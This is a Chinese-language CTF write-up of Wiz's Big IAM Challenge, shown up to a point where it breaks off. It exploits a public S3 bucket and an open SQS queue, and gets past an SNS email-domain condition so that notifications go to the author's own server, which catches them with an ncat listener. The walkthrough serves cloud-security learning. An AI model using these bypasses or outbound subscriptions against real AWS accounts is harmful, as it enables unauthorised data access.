<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="8b4b7a579867021d757be9ab4541d714">云安全系列之IAM安全技术学习</h1>
<h2 data-content="1" id="5badf44333bfe1003877c8dfb2d4d900">前言</h2>
<p>云安全是最近很火的一个方向，随着云计算的广泛采用，云安全的重要性日益增强，因为企业将越来越多的关键任务工作负载转移到云端。所以这也是一个趋势，自己最近也是在学习云安全，在这里做一个详细的学习记录，模式是基础知识+实际操作，这次主要的内容是云安全系列之IAM安全，通过The Big IAM Challenge来一起学习</p>
<h2 data-content="1" id="899253706bb59a42aa7f349f1a3e8213">挑战详细分析</h2>
<h3 data-content="1" id="0d05d20c80e86ea0643dff26ccbe3123">Buckets of Fun</h3>
<p>题目描述</p>
<p>We all know that public buckets are risky. But can you find the flag?</p>
<p>我们都知道公共水桶有风险，你能找到flag吗？</p>
<p>很明显，就是希望我们遍历然后去寻找flag文件</p>
<h4 data-content="1" id="330c7745bf29cc8a62fdd767c11b5e2f">基础知识</h4>
<p><strong>AWS S3 存储桶</strong></p>
<p>你就理解为云上的放置文件的地方</p>
<p>Amazon S3 (Simple Storage Service) 是 AWS 提供的一种对象存储服务。它允许用户存储任意数量的数据，并通过 URL 来访问这些数据。每个存储桶都有唯一的名称，数据存储在存储桶中作为“对象”。</p>
<p>举个例子就能明白了</p>
<p>有一个名为 <code>my-awesome-bucket</code> 的 S3 存储桶，并在该存储桶中存储了一些图片和文档文件。</p>
<p>存储桶 (Bucket)就是my-awesome-bucket</p>
<p>对象 (Object)比如你放的美照，学习资料(懂的都懂哈哈哈)每个文件被称为一个 "对象"。然后对象中存储的就是数据</p>
<p>键 (Key)emm就是文件了的路径</p>
<p>然后访问的基础格式是</p>
<div class="highlight"><pre><span></span><span class="nl">https:</span><span class="c1">//&lt;bucket-name&gt;.s3.&lt;region&gt;.amazonaws.com/&lt;key&gt;</span>
</pre></div>
<p>假设 <code>my-awesome-bucket</code> 在 <code>us-west-1</code> 区域，文件的 URL 将是：</p>
<pre><code>https://my-awesome-bucket.s3.us-west-1.amazonaws.com/photos/vacation/photo1.jpg</code></pre>
<p><strong>S3 Bucket Policies (存储桶策略)</strong></p>
<p>就是平常我们说的这个文件可不可以读，可不可以写的意思，但是其中涉及到一些专有的</p>
<p>我就拿这次的来举例子了</p>
<div class="highlight"><pre><span></span><span class="o">{</span>
    <span class="s">"Version"</span><span class="o">:</span> <span class="s">"2012-10-17"</span><span class="o">,</span>
    <span class="s">"Statement"</span><span class="o">:</span> <span class="o">[</span>
        <span class="o">{</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="s">"*"</span><span class="o">,</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="s">"s3:GetObject"</span><span class="o">,</span>
            <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"</span>
        <span class="o">},</span>
        <span class="o">{</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="s">"*"</span><span class="o">,</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="s">"s3:ListBucket"</span><span class="o">,</span>
            <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"arn:aws:s3:::thebigiamchallenge-storage-9979f4b"</span><span class="o">,</span>
            <span class="s">"Condition"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"StringLike"</span><span class="o">:</span> <span class="o">{</span>
                    <span class="s">"s3:prefix"</span><span class="o">:</span> <span class="s">"files/*"</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p><strong>Effect</strong>: 定义操作是允许 (<code>Allow</code>) 还是拒绝 (<code>Deny</code>)。</p>
<p><strong>Principal</strong>: 指定谁可以执行操作。<code>*</code> 表示所有用户。</p>
<p><strong>Action</strong>: 定义允许进行的操作，比如 <code>s3:GetObject</code> 允许用户下载对象。</p>
<p><strong>Resource</strong>: 定义操作的目标资源。这里指定了某个 S3 存储桶或路径。</p>
<p><code>s3:GetObject</code>: 允许访问特定存储桶中的对象（下载文件）。</p>
<p><code>s3:ListBucket</code>: 允许列出存储桶中的对象（列出文件）。</p>
<p><strong>Condition (条件)</strong>: 可以进一步限制某个操作的执行。此策略使用 <code>StringLike</code> 来限制 <code>ListBucket</code> 操作只能列出 <code>files/</code> 目录下的文件。</p>
<h4 data-content="1" id="4747341d18a73c5db0eeb65f2c7c6a10">实际操作</h4>
<p>首先列出我们能列出的文件列表</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">s3</span> <span class="n">ls</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-storage-9979f4</span>
<span class="n">b</span><span class="o">/</span><span class="n">files</span><span class="o">/</span>
<span class="mi">2023</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mo">05</span> <span class="mi">19</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">53</span>         <span class="mi">37</span> <span class="n">flag1</span><span class="o">.</span><span class="na">txt</span>
<span class="mi">2023</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">08</span> <span class="mi">19</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">24</span>      <span class="mi">81889</span> <span class="n">logo</span><span class="o">.</span><span class="na">pngaws</span> <span class="n">s3</span> <span class="n">ls</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-storage-9979f4b/files/</span>
</pre></div>
<p>可以发现有flag1.txt，然后就是读取了</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-storage-9979f4</span>
<span class="n">b</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span> <span class="o">./</span>
<span class="n">download</span> <span class="n">failed</span><span class="o">:</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-storage-</span>
<span class="mi">9979</span><span class="n">f4b</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span> <span class="n">to</span> <span class="o">./</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span> <span class="o">[</span><span class="n">Errno</span> <span class="mi">30</span><span class="o">]</span>
<span class="n">Read</span><span class="o">-</span><span class="n">only</span> <span class="n">file</span> <span class="n">system</span><span class="o">:</span> <span class="err">'</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">task</span><span class="o">/</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span><span class="o">.</span><span class="na">B72F7F</span>
<span class="mi">62</span><span class="err">'</span><span class="n">aws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-storage-9979f4b/files/flag1.txt ./</span>
</pre></div>
<p>当前目录没有写的权限</p>
<p>这个容易解决，只需要写到临时目录就ok了</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-storage-9979f4</span>
<span class="n">b</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span> <span class="o">/</span><span class="n">tmp</span>
<span class="n">Completed</span> <span class="mi">37</span> <span class="n">Bytes</span><span class="o">/</span><span class="mi">37</span> <span class="n">Bytes</span> <span class="o">(</span><span class="mi">699</span> <span class="n">Bytes</span><span class="o">/</span><span class="n">s</span><span class="o">)</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">f</span>
<span class="nf">ile</span><span class="o">(</span><span class="n">s</span><span class="o">)</span> <span class="n">remainingdownload</span><span class="o">:</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-</span>
<span class="n">storage</span><span class="o">-</span><span class="mi">9979</span><span class="n">f4b</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span> <span class="n">to</span> <span class="o">../../</span><span class="n">tmp</span><span class="o">/</span><span class="n">flag1</span>
<span class="o">.</span><span class="na">txt</span>
<span class="o">&gt;</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flag1</span><span class="o">.</span><span class="na">txt</span>
<span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">exposed</span><span class="o">-</span><span class="n">storage</span><span class="o">-</span><span class="n">risky</span><span class="o">-</span><span class="n">as</span><span class="o">-</span><span class="n">usual</span><span class="o">}</span>
</pre></div>
<p>成功得到flag</p>
<div class="highlight"><pre><span></span><span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">exposed</span><span class="o">-</span><span class="n">storage</span><span class="o">-</span><span class="n">risky</span><span class="o">-</span><span class="n">as</span><span class="o">-</span><span class="n">usual</span><span class="o">}</span>
</pre></div>
<p>当然了也可以直接访问</p>
<div class="highlight"><pre><span></span><span class="nl">https:</span><span class="c1">//thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241011105917-ce0efb5a-877c-1.png"/></p>
<h3 data-content="1" id="958b93d13e16c39a8f1b255fb4f22b6b">Google Analytics</h3>
<p>题目描述</p>
<p>We created our own analytics system specifically for this challenge. We think it’s so good that we even used it on this page. What could go wrong?</p>
<p>Join our queue and get the secret flag.</p>
<p>我们专门为这次挑战创建了自己的分析系统。我们认为它非常出色，甚至将其用于本页面。会出什么问题？</p>
<p>查看IAM Policy</p>
<div class="highlight"><pre><span></span><span class="o">{</span>
    <span class="s">"Version"</span><span class="o">:</span> <span class="s">"2012-10-17"</span><span class="o">,</span>
    <span class="s">"Statement"</span><span class="o">:</span> <span class="o">[</span>
        <span class="o">{</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="s">"*"</span><span class="o">,</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="o">[</span>
                <span class="s">"sqs:SendMessage"</span><span class="o">,</span>      <span class="c1">//发送消息</span>
                <span class="s">"sqs:ReceiveMessage"</span>        <span class="c1">//接收消息</span>
            <span class="o">],</span>
            <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p>允许任何人（Principal 为 <code>*</code>）对 <code>wiz-tbic-analytics-sqs-queue-ca7a1b2</code> 这个 SQS 队列执行发送和接收消息的操作。</p>
<p>Amazon SQS (Simple Queue Service) 是 AWS 提供的一种消息队列服务，用于在分布式应用程序中解耦和协调不同组件。SQS 允许各个系统之间通过发送和接收消息进行异步通信。</p>
<p>估计flag就是在队列的消息中，我们选择接收消息</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sqs</span> <span class="n">receive</span><span class="o">-</span><span class="n">message</span> <span class="o">--</span><span class="n">queue</span><span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="o">:</span><span class="c1">//sqs.&lt;region&gt;.amazonaws.com/&lt;account-id&gt;/&lt;queue-name&gt;</span>
</pre></div>
<p>在<code>"Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"</code>以及给出了我们需要的元素</p>
<p>当然如果我们有权限还可以</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sqs</span> <span class="n">get</span><span class="o">-</span><span class="n">queue</span><span class="o">-</span><span class="n">url</span> <span class="o">--</span><span class="n">queue</span><span class="o">-</span><span class="n">name</span> <span class="n">wiz</span><span class="o">-</span><span class="n">tbic</span><span class="o">-</span><span class="n">analytics</span><span class="o">-</span><span class="n">sqs</span><span class="o">-</span><span class="n">queue</span><span class="o">-</span><span class="n">ca7a1b2</span>
</pre></div>
<p>来直接获取url的值，这里没有权限</p>
<p>但是也可以知道就是</p>
<div class="highlight"><pre><span></span><span class="nl">https:</span><span class="c1">//sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</span>
</pre></div>
<p>尝试获取他的信息</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sqs</span> <span class="n">receive</span><span class="o">-</span><span class="n">message</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">queue</span><span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="o">:</span><span class="c1">//sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sqs</span> <span class="n">receive</span><span class="o">-</span><span class="n">message</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">queue</span><span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="o">:</span><span class="c1">//sqs.us-east-1.amazonaws.co</span>
<span class="n">m</span><span class="o">/</span><span class="mi">092297851374</span><span class="o">/</span><span class="n">wiz</span><span class="o">-</span><span class="n">tbic</span><span class="o">-</span><span class="n">analytics</span><span class="o">-</span><span class="n">sqs</span><span class="o">-</span><span class="n">queue</span><span class="o">-</span><span class="n">ca7a1b</span>
<span class="mi">2</span>
<span class="o">{</span>
    <span class="s">"Messages"</span><span class="o">:</span> <span class="o">[</span>
        <span class="o">{</span>
            <span class="s">"MessageId"</span><span class="o">:</span> <span class="s">"c51dc063-cba1-4a2e-b5b1-</span>
<span class="s">479995d832bf"</span><span class="o">,</span>
            <span class="s">"ReceiptHandle"</span><span class="o">:</span> <span class="s">"AQEB5iO8gTXLSPLeZ1WA</span>
<span class="s">cgyFwhhzhDPRVXeJRPKgu2G07WdD2Y+/Jm1a3vsQzE6JUyzeCX</span>
<span class="s">V/SVUfYRe0Z4kRxxvKtlA31c7fgDzlfG16SYtjtlZsXADtWY1a</span>
<span class="s">ypmVexQ6kh4rxhvuDc/jdp54YrQZBjs7/VxcIfqrZUikxZzFBk</span>
<span class="s">ADvrieftaVJWWyQ3FNXmk8X43shqS/6DUfjhufKBliMJXaQu/U</span>
<span class="s">DPOzEYyncNRCLmXwCXPwxvKHvR1FLCSBdjMKQcwP2PmCh8J919</span>
<span class="s">lmnOg0vKPxZzGETninUenDkQ6qlhmi3mhD8/rqO95Q2xbKkO0u</span>
<span class="s">GYcE2fOBmM7ahhttbBLjOseePKpWnHlQnh2DmvwgfSGfOLkJNZ</span>
<span class="s">sKLNH7VqfvMVJvKUCtqZXp5OXzJVVziYy6hfGezrFCStCKxnjy</span>
<span class="s">ec76lr58o6A="</span><span class="o">,</span>
            <span class="s">"MD5OfBody"</span><span class="o">:</span> <span class="s">"4cb94e2bb71dbd5de6372f7e</span>
<span class="s">aea5c3fd"</span><span class="o">,</span>
            <span class="s">"Body"</span><span class="o">:</span> <span class="s">"{\"URL\": \"https://tbic-wiz-</span>
<span class="s">analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6</span>
<span class="s">ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.3</span>
<span class="s">5046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\"</span>
<span class="s">: true}"</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p>访问</p>
<div class="highlight"><pre><span></span><span class="nl">https:</span><span class="c1">//tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241011105936-d9312cce-877c-1.png"/></p>
<p>得到flag</p>
<div class="highlight"><pre><span></span><span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">you</span><span class="o">-</span><span class="n">are</span><span class="o">-</span><span class="n">at</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">front</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">queue</span><span class="o">}</span>
</pre></div>
<h3 data-content="1" id="4dc88dd28da4a24914bfc983f383fba7">Enable Push Notifications</h3>
<p>We got a message for you. Can you get it?</p>
<p>安全策略</p>
<div class="highlight"><pre><span></span><span class="o">{</span>
    <span class="s">"Version"</span><span class="o">:</span> <span class="s">"2008-10-17"</span><span class="o">,</span>
    <span class="s">"Id"</span><span class="o">:</span> <span class="s">"Statement1"</span><span class="o">,</span>
    <span class="s">"Statement"</span><span class="o">:</span> <span class="o">[</span>
        <span class="o">{</span>
            <span class="s">"Sid"</span><span class="o">:</span> <span class="s">"Statement1"</span><span class="o">,</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"AWS"</span><span class="o">:</span> <span class="s">"*"</span>                                      <span class="c1">//允许任何AWS用户</span>
            <span class="o">},</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="s">"SNS:Subscribe"</span><span class="o">,</span>       <span class="c1">//订阅操作</span>
            <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications"</span><span class="o">,</span>    <span class="c1">//主题ARN</span>
            <span class="s">"Condition"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"StringLike"</span><span class="o">:</span> <span class="o">{</span>
                    <span class="s">"sns:Endpoint"</span><span class="o">:</span> <span class="s">"*@tbic.wiz.io"</span>  <span class="c1">//订阅条件 </span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p>允许任何 AWS 账户的用户订阅名为 <code>TBICWizPushNotifications</code> 的 SNS 主题，但订阅的电子邮件地址必须以 <code>@tbic.wiz.io</code> 结尾。</p>
<p>应该是订阅了就有flag</p>
<p>但是有一个关键的限制</p>
<div class="highlight"><pre><span></span><span class="s">"Condition"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"StringLike"</span><span class="o">:</span> <span class="o">{</span>
                    <span class="s">"sns:Endpoint"</span><span class="o">:</span> <span class="s">"*@tbic.wiz.io"</span>
                <span class="o">}</span>
            <span class="o">}</span>
</pre></div>
<p>表示只允许使用 <code>@tbic.wiz.io</code> 结尾的电子邮件地址进行订阅。例如，<code>example@tbic.wiz.io</code> 可以订阅，但 <code>user@gmail.com</code> 则不行。</p>
<p>订阅的基本格式为</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="o">&lt;</span><span class="n">主题ARN</span><span class="o">&gt;</span> <span class="o">--</span><span class="n">protocol</span> <span class="o">&lt;</span><span class="n">协议</span><span class="o">&gt;</span> <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="o">&lt;</span><span class="n">订阅者Endpoint</span><span class="o">&gt;</span>
</pre></div>
<p>主题在配置文件中已经给出了</p>
<p>大概的命令是</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">protocol</span> <span class="n">email</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="n">lll</span><span class="nd">@tbic.wiz.io</span>
</pre></div>
<p>然后想着随便伪造一个邮件</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">protocol</span> <span class="n">email</span> <span class="err">\</span>
    <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="n">lll</span><span class="nd">@tbic.wiz.io</span>
<span class="o">{</span>
    <span class="s">"SubscriptionArn"</span><span class="o">:</span> <span class="s">"pending confirmation"</span>
<span class="o">}</span><span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="err">\</span>    <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span> <span class="err">\</span>    <span class="o">--</span><span class="n">protocol</span> <span class="n">email</span> <span class="err">\</span>    <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="n">lll</span><span class="nd">@tbic.wiz.io</span>
</pre></div>
<p>我还要去 <code>lll@tbic.wiz.io</code> 邮箱查找一封来自 AWS SNS 的确认邮件。</p>
<p>思考一下如何绕过</p>
<p>尝试了一波url中的绕过</p>
<div class="highlight"><pre><span></span><span class="o">&gt;</span> <span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span>
<span class="o">--</span><span class="n">protocol</span> <span class="n">http</span> <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="n">https</span><span class="o">:</span><span class="c1">//49.232.222.195:2334%23@tbic.wiz.io</span>

<span class="n">An</span> <span class="n">error</span> <span class="nf">occurred</span> <span class="o">(</span><span class="n">InvalidParameter</span><span class="o">)</span> <span class="n">when</span> <span class="n">calling</span> <span class="n">the</span> <span class="n">Subscribe</span> <span class="n">operation</span><span class="o">:</span> <span class="n">Invalid</span> <span class="n">parameter</span>
<span class="o">:</span> <span class="n">Endpoint</span> <span class="n">must</span> <span class="n">match</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">protocol</span>


<span class="o">&gt;</span> <span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span>
<span class="o">--</span><span class="n">protocol</span> <span class="n">http</span> <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="n">https</span><span class="o">:</span><span class="c1">//49.232.222.195:2334?a=@tbic.wiz.io</span>

<span class="n">An</span> <span class="n">error</span> <span class="nf">occurred</span> <span class="o">(</span><span class="n">InvalidParameter</span><span class="o">)</span> <span class="n">when</span> <span class="n">calling</span> <span class="n">the</span> <span class="n">Subscribe</span> <span class="n">operation</span><span class="o">:</span> <span class="n">Invalid</span> <span class="n">parameter</span>
<span class="o">:</span> <span class="n">Endpoint</span> <span class="n">must</span> <span class="n">match</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">protocol</span>
</pre></div>
<p>都失败了</p>
<p>最后发现可以</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sns</span> <span class="n">subscribe</span> <span class="o">--</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span>
<span class="o">--</span><span class="n">protocol</span> <span class="n">http</span> <span class="o">--</span><span class="n">notification</span><span class="o">-</span><span class="n">endpoint</span> <span class="n">http</span><span class="o">:</span><span class="c1">//49.232.222.195:2334/@tbic.wiz.io</span>
<span class="o">{</span>
    <span class="s">"SubscriptionArn"</span><span class="o">:</span> <span class="s">"pending confirmation"</span>
<span class="o">}</span>
</pre></div>
<p>然后公网服务器得到了结果</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@VM</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">17</span><span class="o">-</span><span class="n">ubuntu</span><span class="o">:~</span><span class="err">#</span> <span class="n">ncat</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2334</span>
<span class="nl">Ncat:</span> <span class="n">Version</span> <span class="mf">7.80</span> <span class="o">(</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org/ncat )</span>
<span class="nl">Ncat:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">2334</span>
<span class="nl">Ncat:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="o">:</span><span class="mi">2334</span>
<span class="nl">Ncat:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">15.221.161.87</span><span class="o">.</span>
<span class="nl">Ncat:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">15.221.161.87</span><span class="o">:</span><span class="mf">27966.</span>
<span class="n">POST</span> <span class="o">/</span><span class="nd">@tbic.wiz.io</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">message</span><span class="o">-</span><span class="n">type</span><span class="o">:</span> <span class="n">SubscriptionConfirmation</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">message</span><span class="o">-</span><span class="n">id</span><span class="o">:</span> <span class="n">df58775d</span><span class="o">-</span><span class="n">c3ff</span><span class="o">-</span><span class="mi">4</span><span class="n">ef1</span><span class="o">-</span><span class="mi">958</span><span class="n">d</span><span class="o">-</span><span class="mi">64475</span><span class="n">ed81c91</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span><span class="o">:</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="o">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">1623</span>
<span class="nl">Host:</span> <span class="mf">49.232.222.195</span><span class="o">:</span><span class="mi">2334</span>
<span class="nl">Connection:</span> <span class="n">Keep</span><span class="o">-</span><span class="n">Alive</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Amazon</span> <span class="n">Simple</span> <span class="n">Notification</span> <span class="n">Service</span> <span class="n">Agent</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="o">,</span><span class="n">deflate</span>

<span class="o">{</span>
  <span class="s">"Type"</span> <span class="o">:</span> <span class="s">"SubscriptionConfirmation"</span><span class="o">,</span>
  <span class="s">"MessageId"</span> <span class="o">:</span> <span class="s">"df58775d-c3ff-4ef1-958d-64475ed81c91"</span><span class="o">,</span>
  <span class="s">"Token"</span> <span class="o">:</span> <span class="s">"2336412f37fb687f5d51e6e2425ba1f30ada01309a96da3c7072d512501b25ede6e690169cfa386bcbaaff265d4c3f0d047153f295e97cc4020e420f36ae2553aac73fd2baef6c051670ce02ab10fb09f7db661b1ef915af87b781a8de16db691509852a3460ff3227bbc1ad2ff749cb3d58fb1166824006220132dc88fdceb2"</span><span class="o">,</span>
  <span class="s">"TopicArn"</span> <span class="o">:</span> <span class="s">"arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications"</span><span class="o">,</span>
